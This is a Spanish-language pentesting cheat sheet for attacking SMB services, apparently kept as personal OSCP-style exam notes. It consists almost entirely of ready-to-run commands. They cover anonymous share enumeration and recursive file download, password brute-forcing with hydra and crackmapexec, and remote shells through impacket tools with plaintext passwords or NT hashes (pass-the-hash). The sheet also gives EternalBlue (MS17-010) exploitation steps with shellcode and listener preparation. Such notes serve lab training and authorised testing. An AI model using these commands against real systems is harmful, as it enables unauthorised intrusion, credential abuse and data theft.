
**CALCULAR VERSIÓN SI NMAP NO LO DETECTA

```
A veces, nmap no muestra la versión de Samba en el host remoto, si esto sucede, una buena manera de saber qué versión está ejecutando el host remoto es capturar el tráfico con wireshark contra el host remoto en 445/139 y ejecutarlo en paralelo. un smbclient -L, haga un flujo de seguimiento de tcp y con esto podríamos ver qué versión está ejecutando el servidor.

OR

sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <IP>
```

**ESCANEAR VULNERABILIDADES

```
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```

*If :

-   MS17-010 - [EternalBlue](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#EternalBlue%20(MS17-010))

**MANUAL TESTING

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R
smbmap -u 'user' -p 'password' -H IP -r SHARE
smbmap -u 'user' -p 'password' -H IP -r SHARE/directorio
smbmap -u 'user' -p 'password' -H IP --download SHARE/directorio/archivo

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Descargar todos los archivos de un directorio recursivamente:
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
```

**BRUTEFORCE

```
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```

**MONTAR UN SMB SHARE A TU PC LOCAL

```
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```

**CONSEGUIR UNA SHELL

```
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```

- **ETERNALBLUE (MS17-010)

```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

*PARA VER SI ES VULNERABLE*

```
python eternal_checker.py <IP> #creo que era python3
```

*PARA EXPLOTARLO*

Forma 1 (más compleja, usar el exploit según la versión de Windows objetivo) **(probar python2 y python3)

Preparar shellcodes y listeners

```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

Explotación

```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin

Es posible que necesite ejecutarse varias veces para funcionar
```

Forma 2 (más fácil)

```
python2.7 zzz_exploit.py <IP>
```
